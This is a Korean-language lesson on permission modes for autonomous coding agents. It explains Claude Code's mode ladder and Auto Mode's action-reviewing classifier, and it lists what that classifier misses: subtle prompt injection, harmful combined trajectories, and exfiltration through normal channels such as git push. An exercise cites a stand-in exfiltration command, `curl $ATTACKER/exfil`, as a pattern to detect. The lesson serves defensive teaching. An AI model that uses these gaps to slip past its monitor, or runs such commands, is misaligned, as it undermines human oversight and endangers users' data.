# 자율 에이전트를 위한 권한 모드

> 🇰🇷 이 문서는 한국어 번역본입니다(ELI5 스타일). 원문: [en.md](en.md)

> 권한 사다리 — 모든 행동을 검토하기부터 모든 것을 승인하기까지 단계별 자율 수준 — 는 하네스(harness)가 자율 에이전트가 묻지 않고 할 수 있는 일의 범위를 통제하는 방식입니다. 이 레슨의 실습 예제인 Claude Code는 여섯 가지 모드를 노출합니다: "plan"은 모든 행동 전에 묻고, "default"(UI에서는 "Manual"로 표시)는 위험한 행동에만 묻으며, "acceptEdits"는 파일 쓰기를 자동 승인하지만 셸 실행은 여전히 확인하고, "bypassPermissions"는 모든 것을 승인합니다. Auto Mode — `auto` 권한 모드 — 는 행동별 승인을 별도의 분류기 모델로 대체합니다. 이 모델은 각 행동이 실행되기 전에 검토하고, 요청이 의도한 범위를 넘어 확대되는 것은 무엇이든 차단합니다. 액션 예산은 `max_turns`와 `max_budget_usd`로 강제됩니다. `auto`의 가용 여부는 플랜, 조직 활성화, 모델, 제공자에 따라 달라지며 — Anthropic은 분류기만으로는 충분하지 않다고 명시합니다.

**유형:** 학습(Learn)
**언어:** Python (표준 라이브러리, 2단계 분류기 시뮬레이터)
**선수 지식:** 페이즈 15 · 01 (장기 에이전트), 페이즈 15 · 09 (코딩 에이전트 현황)
**시간:** 약 45분

## 문제

여러분의 머신 위에서 돌아가는 자율 코딩 에이전트는 별개의 보안 카테고리입니다. 공격 표면은 에이전트가 닿을 수 있는 모든 것입니다 — 파일 시스템, 네트워크, 자격 증명, 클립보드, 어떤 브라우저 탭이든, 열려 있는 어떤 터미널이든. 브루스 슈나이어(Bruce Schneier) 등이 공개적으로 지적했듯: 컴퓨터 사용 에이전트는 챗봇의 "기능 업데이트"가 아니라, 새로운 종류의 위험 프로필을 가진 새로운 종류의 도구입니다.

Claude Code의 권한 시스템이 Anthropic의 답입니다. "자율/비자율" 하나의 스위치 대신, 능력 사다리를 잇는 여섯 가지 모드가 있습니다: plan → default → acceptEdits → … → bypassPermissions. 각 모드는 속도와 행동별 검토 사이의 서로 다른 트레이드오프입니다. Auto Mode(2026년 3월)는 승인을 사용자의 중요 경로에서 벗어나게 하는 별도의 분류기 모델을 추가합니다: 각 행동이 실행되기 전에 검토하고, 요청 범위를 넘어 확대되는 것은 차단합니다.

공학적 질문은 이것입니다: 이 시스템은 무엇을 잡아내고, 무엇을 놓치며, 주어진 태스크에는 실제로 어느 모드가 알맞은가?

## 개념

### 여섯 가지 권한 모드

| 모드 | 행동 | 언제 쓰나 |
|---|---|---|
| `plan` | 에이전트가 계획을 제안; 사용자가 계획 전체를 승인; 모든 행동이 실행 전에 검토됨 | 낯선 태스크; 프로덕션 인접 코드; 저장소에서 에이전트를 처음 쓸 때 |
| `default` | UI에서는 "Manual"로 표시. 에이전트가 행동을 실행; "위험한" 행동(셸 실행, 파괴적 작업, 네트워크 호출)에서는 사용자에게 묻음 | 대부분의 대화형 코딩 세션 |
| `acceptEdits` | 파일 쓰기는 자동 승인; 셸 실행과 네트워크 호출은 여전히 묻음 | 많은 파일에 걸친 리팩토링 작업 |
| `auto` | 별도의 분류기 모델이 각 행동을 실행 전에 검토; 요청 범위를 넘어 확대되는 것은 차단 | 통제된 워크스페이스 안의 장기 무인 실행 |
| `dontAsk` | 절대 묻지 않음; 권한 규칙이 사전 승인하지 않은 행동은 거부됨 | 임시 샌드박스, CI 작업, 연구 스크립트 |
| `bypassPermissions` | 모든 것을 승인 | "버릴 의향이 있는 임시 컨테이너 안에서만"이라고 문서화됨 |

(위 이름들은 공개된 Claude Code 문서와 일치합니다; UI는 `default`를 "Manual"로 표기합니다.)

### Auto Mode 한 페이지 요약

Auto Mode(2026년 3월 24일 출시)는 행동별 승인을 모델에 위임한 최초의 권한 모드입니다. 구조:

1. **별도의 분류기 모델.** 실행되기 전에 모든 제안된 행동을 검토하고, 선언된 태스크와 세션의 현재 상태를 기준으로 판단하며, 요청이 요구한 것을 넘어 확대되는 것은 무엇이든 차단합니다. 차단된 행동은 사용자에게 되돌아갑니다.
2. **게이트된 가용성.** `auto`가 아예 제공되는지는 플랜, 조직 활성화, 모델, 제공자에 따라 달라집니다.

예산 통제가 분류기와 나란히 놓입니다:

- `max_turns` — 세션의 총 반복 횟수.
- `max_budget_usd` — 세션을 중단시키는 달러 상한.
- 도구별 액션 횟수 제한 (`WebFetch`는 N번 이하 등).

### 시스템이 잡아내는 것

- 주입된 지시가 알려진 위험 행동 형태로 이어지는, 도구 입력에 대한 단순한 프롬프트 인젝션.
- 반복적인 도구 루프 — 분류기는 액션 N+1이 액션 N과 거의 동일함을, 다섯 번 연속으로도 볼 수 있습니다.
- 파일 편집만 하는 세션에서 명백히 범위를 벗어난 셸 명령.

### 시스템이 놓칠 수 있는 것

- **미묘한 프롬프트 인젝션**: 단일한 표적 행동을 만들지 않으면서 행동을 서서히 조절합니다. 간접 프롬프트 인젝션은 완전히 패치 가능한 취약점이 아닙니다(OpenAI 준비성 책임자, 2025, 브라우저 에이전트에 대해 — 레슨 11 참조).
- **의미 수준의 잘못된 행동.** 개별 액션은 모두 안전해 보이는데 합쳐진 궤적은 해로울 수 있습니다. 분류기는 액션을 판단할 뿐; 사용자의 의도를 다시 도출하지는 않습니다.
- **정상적인 채널을 통한 유출.** 소유한 파일에 데이터를 쓰고, 그다음 공개 저장소로 `git push`하는 것은, 허용된 행동들의 나열이지만 그 조합이 문제입니다.

### 연구 프리뷰로서의 프레이밍

Anthropic은 Auto Mode를 연구 프리뷰(research preview)로 출시했습니다. 문서는 분류기가 해결책이 아니라 하나의 계층이라고 명확히 말합니다: 사용자는 Auto Mode를 예산, 허용 목록, 격리된 워크스페이스, 궤적 감사(레슨 12~16)와 결합할 것으로 기대됩니다. 프리뷰라는 프레이밍은 문서화된 평가-배포 격차(레슨 1)도 반영합니다 — 오프라인 평가를 통과한 분류기도, 사용자의 맥락이 모호한 실제 세션에서는 다르게 행동할 수 있습니다.

### 이 사다리가 여러분의 워크플로에서 사는 곳

- 낯선 태스크: `plan`으로 시작하세요. 계획을 읽는 것이 나쁜 실행을 롤백하는 것보다 쌉니다.
- 익숙한 리팩토링: `acceptEdits`가 확인 클릭을 많이 줄여 줍니다.
- 무인 백그라운드 실행: `auto`는 폭발 반경을 측정해 둔 워크스페이스 안에서만 (자격 증명 없음, 프로덕션 마운트 없음, 동의하지 않은 외부 통신 없음).
- 임시 컨테이너: `dontAsk` / `bypassPermissions`는 컨테이너와 그 자격 증명이 일회용일 때에 한해 수용 가능합니다.

## 사용해 보기

`code/main.py`는 행동 검토 분류기를 2단계 파이프라인으로 시뮬레이션합니다 — 가르치기 위한 단순화입니다; 실제 `auto` 모드는 문서화된 2단계 계약이 아니라 별도의 분류기 모델이 뒷받침합니다. 1단계는 제안된 행동 위의 저렴한 키워드 규칙; 2단계는 더 느린 다중 규칙 검토자입니다. 드라이버는 짧은 합성 궤적(안전한 행동, 프롬프트 인젝션 시도, 반복 루프)을 넣어 분류기가 어디서 잡아내고 어디서 놓치는지 보여줍니다.

## 출시해 보기

`outputs/skill-permission-mode-picker.md`는 태스크 설명을 올바른 권한 모드, 예산 상한, 필요한 격리와 대응시켜 줍니다.

## 연습 문제

1. `code/main.py`를 실행해 보세요. 어떤 합성 행동 유형은 1단계에서 절대 표적되지 않지만 2단계에서는 항상 잡히나요? 어느 단계에서도 잡히지 않는 것은 무엇인가요?

2. 특정한 알려진 나쁜 형태(예: `curl $ATTACKER/exfil`)를 잡도록 1단계 규칙 집합을 확장해 보세요. 정상 행동 샘플에서의 오탐(false positive) 비율을 측정하세요.

3. Anthropic의 "How the agent loop works" 문서를 읽어 보세요. `default` 모드에서 에이전트가 기본적으로 건드리는 모든 외부 상태를 나열하세요. 그중 `auto`를 무인으로 실행하기 전에 별도로 게이트해야 할 것은 어느 것인가요?

4. 24시간 무인 실행 예산을 설계해 보세요: `max_turns`, `max_budget_usd`, 도구별 상한, 허용 목록. 각 숫자를 정당화하세요.

5. 개별 액션은 모두 분류기의 승인을 받는데도 합쳐진 행동은 잘못 정렬된 궤적 하나를 묘사해 보세요. (레슨 14가 킬 스위치와 카나리아 토큰이 이것을 어떻게 다루는지 다룹니다.)
